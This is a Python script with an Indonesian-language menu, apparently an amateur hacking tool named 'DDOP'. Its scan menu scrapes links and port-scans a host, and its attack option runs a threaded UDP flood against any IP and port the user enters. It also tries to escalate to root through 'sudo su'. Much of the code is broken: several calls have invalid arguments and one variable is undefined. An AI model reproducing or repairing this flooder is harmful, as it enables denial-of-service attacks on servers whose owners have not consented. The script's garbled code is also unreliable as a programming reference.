import socket
import os
from bs4 import BeautifulSoup
from datetime import datetime
from colorama import Fore, init
init()
import art
import random
import threading
import requests
import time

os.system("clear")
loggin = os.geteuid()
if not loggin == 0:
    os.system("sudo su")
    print("perangkat anda berada di lingkungan root")
    time.sleep(5)
    os.system("clear")

print("SEDANG LOADING SCRIPT[+]")
time.sleep(5)
os.system("clear")
print("\033[1;36;48mWAKTU :",time.ctime())
print("PEMBUAT : ADNAN")
print("\033[1;33;48m")
print(art.text2art("DDOP", font="block", chr_ignore=True))
print("1\033[4;37;48m.scan")
print("2.ATTACK")
pencarian = int(input("\033[1;34;48mSILAHKAN MASUKAN PILIHAN ::> "))
print(pencarian)
os.system("clear")
if pencarian == 1:
    print("\033[1;36;48mWAKTU : ",time.ctime())
    print("AUTHOR : ADNAN")
    print("\033[1;33;48m")
    print(art.text2art("SCAN"))
    print("033[1;37;48m")
    print("1.SCAN WEB")
    print("2.SCAN IP/PORT")
    print("3.SCAN SERVER")
    pencarian_scan = int(input("SILAHKAN MASUKAN PILIHAN ::> "))
    if pencarian_scan == 1:
        URL = input("masukan url : ")
        page = requests.get(URL)
        soup = BeautifulSoup(page.content, "html.parser")
        t = soup.find_all("a")
        print(t)
    if pencarian_scan == 2:
             ip = socket.gethostbyname(input("masukan ip :> "))
             def portscan(port):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                con = s.connect(ip,port)
                print("port : ",port,"open")
                r = 1
                for x in range(1,100):
                    t = threading.Thread(con=portscan,kwargs={"ports":r})
                    t += 1
                    t.start()
    if pencarian_scan == 3:
                        print("MASI DIKERJAKAN \U0001f600")
if pencarian == 2:
        os.system("clear")
        p = art.text2art("ATK",font="small")
        print(p)
        print("1.DDOS SERVER ?| ")
        print("2.BELOM DIPIKIR")
        print("3.BELOM DIPIKIR")
        pencarian_attack = int(input("masukan pilihan >= "))
        if  pencarian_attack == 1:
            host = input("enter ip : ")
            port = int(input("masukin port : "))
            udp_port = port
            bs = random.random(2543)
            time.sleep(2)
            ip_atk = socket.gethostbyname(host)
            print("TARGET IP : ", ip_atk)
            time.sleep(3)
            print("TARGET PORT : ", udp_port)
            sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            def run(k):
                while True:
                    sock.sendto(bs,(ip_atk,port))
                    print(f"{Fore.BLUE}MENYERANG PAKET {Fore.CYAN}{ip}{Fore.BLACK}")
            for  i in range(10):
                ch = threading.Thread(target=run,args=[i])
                ch.start()